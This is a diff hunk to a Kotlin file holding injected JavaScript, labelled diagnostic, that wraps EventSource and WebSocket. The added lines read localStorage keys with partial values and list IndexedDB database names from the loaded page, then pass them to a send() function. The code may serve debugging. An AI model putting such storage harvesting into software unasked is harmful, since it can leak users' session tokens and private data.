@@ -97,6 +97,11 @@ private const val HOOK_JS = """
  try{ var OES=window.EventSource; if(OES){ window.EventSource=function(u,o){
    try{ send({m:'SSE',u:String(u).slice(0,160),s:0,p:'DIAG eventsource @'+String(location.hostname),h:'',r:''}); }catch(e){}
    return o?new OES(u,o):new OES(u); }; window.EventSource.prototype=OES.prototype; } }catch(e){}
+ try{ setTimeout(function(){
+   var out=[]; try{ for(var i=0;i<localStorage.length&&i<40;i++){ var k=localStorage.key(i), v=localStorage.getItem(k)||''; out.push(k.slice(0,40)+'='+v.length+'b:'+v.slice(0,40).replace(/\s+/g,' ')); } }catch(e){ out.push('нет доступа'); }
+   send({m:'LS',u:String(location.hostname),s:0,p:'DIAG localStorage '+out.join(' | ').slice(0,1800),h:'',r:''});
+   try{ if(window.indexedDB&&indexedDB.databases){ indexedDB.databases().then(function(d){ send({m:'IDB',u:String(location.hostname),s:0,p:'DIAG indexedDB '+d.map(function(x){return x.name}).join(', '),h:'',r:''}); }); } }catch(e){}
+  },4000); }catch(e){}
  var wsn=0, OW=window.WebSocket;
  if(OW){ window.WebSocket=function(u,pr){ var ws=pr?new OW(u,pr):new OW(u);
    try{ send({m:'WS',u:String(u),s:0,p:'open',h:'',r:''});
